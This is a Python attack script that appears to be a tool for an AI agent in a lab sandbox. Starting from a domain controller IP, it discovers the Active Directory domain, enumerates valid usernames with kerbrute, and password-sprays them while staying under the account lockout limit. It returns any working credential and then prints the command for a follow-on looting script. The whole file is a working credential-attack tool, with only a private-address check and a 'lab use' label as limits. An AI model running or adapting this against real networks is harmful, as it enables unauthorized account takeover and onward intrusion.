#!/usr/bin/env python3
"""ad_foothold.py - from a target DC IP and nothing else, establish a first domain credential.

Steps (all unauthenticated):
  1. Discover the domain + DC hostname from the IP (nxc smb negotiation leaks both; normal
     protocol behavior, not blocked by signing/channel-binding).
  2. Enumerate which candidate usernames actually exist (kerbrute userenum, Kerberos AS-REQ;
     does NOT increment the account lockout counter).
  3. Password-spray the valid users with a small targeted wordlist, LOCKOUT-SAFE: at most
     --max-attempts-per-user passwords per invocation (default 2, under a 3/15/15 policy),
     one password across all users per round, stop on first hit.

Models a from-zero foothold: input is the DC IP plus an OSINT-style username seed list (a
standard pre-engagement recon artifact); output is a validated low-priv domain credential.
Lab use: ATT&CK T1589.002 (user enumeration) + T1110.003 (password spraying).
RFC1918 targets only unless --allow-public.
"""
import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys

ANSI = re.compile(r'\x1b\[[0-9;]*m')
HERE = os.path.dirname(os.path.abspath(__file__))
WL = os.path.join(os.path.dirname(HERE), "wordlists")

DOM = re.compile(r'\(domain:([^)]+)\)', re.I)
HOST = re.compile(r'\(name:([^)]+)\)', re.I)
KB_USER = re.compile(r'VALID USERNAME:\s+(\S+)', re.I)
KB_LOGIN = re.compile(r'VALID LOGIN:\s+(\S+)', re.I)  # e.g. blacksea.lab\mgibbs:BlackPearl2026!


def fail(msg, **extra):
    print(json.dumps({"error": msg, **extra}))
    sys.exit(1)


def run(cmd, timeout=180):
    # nxc writes first-run config under HOME/NXC_HOME; the sandbox HOME/workspace may be
    # read-only, so point both at a writable temp dir (matches the ad-loot skill).
    nxc_home = "/tmp/nxc"
    os.makedirs(nxc_home, exist_ok=True)
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           env={**os.environ, "HOME": nxc_home, "NXC_HOME": nxc_home})
    except FileNotFoundError as e:
        fail(f"missing binary: {e}")
    except subprocess.TimeoutExpired:
        fail(f"command timed out: {' '.join(cmd)}")
    return ANSI.sub("", p.stdout + "\n" + p.stderr)


def discover(dc):
    if not shutil.which("nxc"):
        fail("nxc (NetExec) not found")
    text = run(["nxc", "smb", dc], timeout=60)
    d = DOM.search(text)
    h = HOST.search(text)
    return (d.group(1).strip() if d else None,
            h.group(1).strip() if h else None,
            text)


def enum_users(domain, dc, userlist):
    out = run(["kerbrute", "userenum", "-d", domain, "--dc", dc, userlist], timeout=240)
    users = []
    for line in out.splitlines():
        m = KB_USER.search(line)
        if m:
            u = m.group(1).split("@")[0].split("\\")[-1]
            if u and u not in users:
                users.append(u)
    return users, out


def spray(domain, dc, users, passwords, cap):
    """One password across all users per round; cap rounds to stay under the lockout threshold."""
    valid = []
    rounds = 0
    tmp = "/tmp/_fh_users.txt"
    with open(tmp, "w") as f:
        f.write("\n".join(users) + "\n")
    for pw in passwords[:cap]:
        out = run(["kerbrute", "passwordspray", "--safe", "-d", domain, "--dc", dc, tmp, pw], timeout=240)
        rounds += 1
        for line in out.splitlines():
            m = KB_LOGIN.search(line)
            if m and ":" in m.group(1):
                user, _, password = m.group(1).partition(":")
                sam = user.split("\\")[-1].split("@")[0]  # strip DOMAIN\ and @realm -> bare sam
                valid.append({"user": sam, "password": password, "raw": m.group(1)})
        if valid:
            break
    return valid, rounds


def main():
    ap = argparse.ArgumentParser(
        description="From a DC IP, establish a first domain credential (enum + lockout-safe spray).")
    ap.add_argument("dc", help="DC IP (RFC1918 unless --allow-public)")
    ap.add_argument("--domain", help="domain/realm (auto-discovered from the IP if omitted)")
    ap.add_argument("--userlist", default=os.path.join(WL, "users.txt"),
                    help="candidate usernames (OSINT seed list)")
    ap.add_argument("--passlist", default=os.path.join(WL, "passwords.txt"),
                    help="targeted spray passwords")
    ap.add_argument("--max-attempts-per-user", type=int, default=2,
                    help="max spray rounds per invocation; keep below the lockout threshold "
                         "(default 2 for a 3/15/15 policy)")
    ap.add_argument("--allow-public", action="store_true",
                    help="OVERRIDE: permit non-RFC1918 targets (requires authorization)")
    args = ap.parse_args()

    try:
        ip = socket.gethostbyname(args.dc)
    except OSError as e:
        fail(f"cannot resolve {args.dc}: {e}")
    if not args.allow_public and not ipaddress.ip_address(ip).is_private:
        fail(f"out-of-scope target {args.dc} ({ip}) is not RFC1918")
    if not shutil.which("kerbrute"):
        fail("kerbrute not found in this environment (add it to the tools image)")

    domain, host, disco_raw = args.domain, None, ""
    if not domain:
        domain, host, disco_raw = discover(args.dc)
        if not domain:
            fail("could not discover domain from the IP; pass --domain explicitly",
                 nxc_smb=disco_raw.strip()[:300])

    if not os.path.exists(args.userlist):
        fail(f"userlist not found: {args.userlist}")
    if not os.path.exists(args.passlist):
        fail(f"passlist not found: {args.passlist}")
    with open(args.passlist) as f:
        passwords = [l.strip() for l in f if l.strip() and not l.lstrip().startswith("#")]

    valid_users, _ = enum_users(domain, args.dc, args.userlist)
    if not valid_users:
        fail("no valid users enumerated; widen the userlist", domain=domain, dc=args.dc)

    creds, rounds = spray(domain, args.dc, valid_users, passwords, args.max_attempts_per_user)

    foothold = creds[0] if creds else None
    nxt = (
        "run ad-loot with the foothold cred: python3 /workspace/skills/ad-loot/scripts/ad_loot.py "
        f"{args.dc} -u {foothold['user']} -p '{foothold['password']}'"
        if foothold else
        "no cred yet; if passwords remain, WAIT OUT the 15-min lockout window before another round"
    )
    print(json.dumps({
        "dc": args.dc, "ip": ip, "domain": domain, "dc_host": host,
        "valid_users": valid_users,
        "spray_rounds": rounds,
        "max_attempts_per_user": args.max_attempts_per_user,
        "creds_found": creds,
        "foothold": foothold,
        "next": nxt,
    }, indent=2))


if __name__ == "__main__":
    main()
